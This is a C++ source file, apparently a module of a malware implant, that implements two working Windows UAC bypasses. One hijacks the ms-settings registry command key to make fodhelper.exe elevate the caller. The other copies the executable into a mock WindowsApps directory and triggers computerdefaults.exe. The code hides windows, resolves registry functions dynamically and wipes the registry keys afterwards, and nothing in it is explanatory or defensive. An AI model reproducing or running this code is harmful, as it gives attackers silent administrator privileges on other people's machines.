#include "UacBypass.h"

#include <windows.h>
#include <shlobj.h>

#include <string>

#pragma comment(lib, "shell32.lib")

namespace uac {

namespace {

template <typename T>
T get_proc(HMODULE mod, const char* name) {
    if (!mod) return nullptr;
    return reinterpret_cast<T>(GetProcAddress(mod, name));
}

using RegCreateKeyExA_t = LONG(WINAPI*)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, const LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
using RegSetValueExA_t = LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
using RegDeleteTreeA_t = LONG(WINAPI*)(HKEY, LPCSTR);
using RegCloseKey_t = LONG(WINAPI*)(HKEY);

bool copy_self(const char* dest) {
    char self[MAX_PATH] = {};
    if (!GetModuleFileNameA(nullptr, self, MAX_PATH)) return false;
    return CopyFileA(self, dest, FALSE) != 0;
}

} // namespace

std::string fodhelper_bypass() {
    HMODULE adv = GetModuleHandleA("advapi32.dll");
    auto RegCreateKeyExA_ = get_proc<RegCreateKeyExA_t>(adv, "RegCreateKeyExA");
    auto RegSetValueExA_ = get_proc<RegSetValueExA_t>(adv, "RegSetValueExA");
    auto RegDeleteTreeA_ = get_proc<RegDeleteTreeA_t>(adv, "RegDeleteTreeA");
    auto RegCloseKey_ = get_proc<RegCloseKey_t>(adv, "RegCloseKey");
    if (!RegCreateKeyExA_ || !RegSetValueExA_ || !RegCloseKey_) return "error: resolve";

    char self[MAX_PATH] = {0};
    if (!GetModuleFileNameA(nullptr, self, MAX_PATH)) return "error: self path";

    HKEY h = nullptr;
    const char* subkey = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    if (RegCreateKeyExA_(HKEY_CURRENT_USER, subkey, 0, nullptr, 0,
                         KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS) {
        return "error: create key";
    }
    if (RegSetValueExA_(h, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(self),
                        static_cast<DWORD>(strlen(self) + 1)) != ERROR_SUCCESS) {
        RegCloseKey_(h);
        return "error: set command";
    }
    const char* delegate = "DelegateExecute";
    if (RegSetValueExA_(h, delegate, 0, REG_SZ, reinterpret_cast<const BYTE*>(""), 1) != ERROR_SUCCESS) {
        RegCloseKey_(h);
        return "error: set delegate";
    }
    RegCloseKey_(h);

    STARTUPINFOW si{}; PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    BOOL ok = CreateProcessW(nullptr, const_cast<LPWSTR>(L"C:\\Windows\\System32\\fodhelper.exe"),
                             nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (ok) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }

    if (RegDeleteTreeA_) {
        RegDeleteTreeA_(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    }

    return ok ? "fodhelper triggered; registry cleaned" : "fodhelper spawn failed; registry cleaned";
}

std::string mockdir_bypass() {
    char local[MAX_PATH] = {};
    if (FAILED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, local))) {
        return "error: LOCALAPPDATA";
    }

    std::string dir = std::string(local) + "\\Microsoft\\WindowsApps";
    CreateDirectoryA((std::string(local) + "\\Microsoft").c_str(), nullptr);
    CreateDirectoryA(dir.c_str(), nullptr);

    std::string dest = dir + "\\ComputerDefaults.exe";
    if (!copy_self(dest.c_str())) {
        return "error: copy self " + std::to_string(GetLastError());
    }

    HMODULE adv = GetModuleHandleA("advapi32.dll");
    auto RegCreateKeyExA_ = get_proc<RegCreateKeyExA_t>(adv, "RegCreateKeyExA");
    auto RegSetValueExA_ = get_proc<RegSetValueExA_t>(adv, "RegSetValueExA");
    auto RegDeleteTreeA_ = get_proc<RegDeleteTreeA_t>(adv, "RegDeleteTreeA");
    auto RegCloseKey_ = get_proc<RegCloseKey_t>(adv, "RegCloseKey");
    if (!RegCreateKeyExA_ || !RegSetValueExA_ || !RegCloseKey_) return "error: resolve";

    HKEY h = nullptr;
    const char* subkey = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    if (RegCreateKeyExA_(HKEY_CURRENT_USER, subkey, 0, nullptr, 0,
                         KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS) {
        return "error: create key";
    }
    if (RegSetValueExA_(h, nullptr, 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(dest.c_str()),
                        static_cast<DWORD>(dest.size() + 1)) != ERROR_SUCCESS) {
        RegCloseKey_(h);
        return "error: set command";
    }
    if (RegSetValueExA_(h, "DelegateExecute", 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(""), 1) != ERROR_SUCCESS) {
        RegCloseKey_(h);
        return "error: set delegate";
    }
    RegCloseKey_(h);

    STARTUPINFOW si{}; PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    BOOL ok = CreateProcessW(nullptr,
        const_cast<LPWSTR>(L"C:\\Windows\\System32\\computerdefaults.exe"),
        nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (ok) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }

    if (RegDeleteTreeA_) {
        RegDeleteTreeA_(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    }

    return ok
        ? ("mockdir triggered via " + dest + "; registry cleaned")
        : ("mockdir spawn failed; payload at " + dest);
}

} // namespace uac
